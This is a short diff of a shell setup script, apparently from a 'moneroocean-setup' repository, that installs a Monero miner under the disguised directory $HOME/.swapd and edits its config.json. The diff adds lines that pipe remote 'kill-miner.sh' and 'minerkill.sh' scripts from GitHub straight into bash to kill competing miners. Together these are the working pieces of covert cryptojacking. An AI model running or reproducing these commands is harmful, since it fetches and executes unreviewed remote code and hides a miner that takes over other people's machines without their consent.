@@ -21,7 +21,8 @@ EMAIL=$2 # this one is optional
 
 #BotKiller
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
-#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
+curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
+curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
 
 # checking prerequisites
 
@@ -244,7 +245,7 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.sw
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
-echo "[*] Copying xmrig-proxy config"
+#echo "[*] Copying xmrig-proxy config"
 
 #mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
 
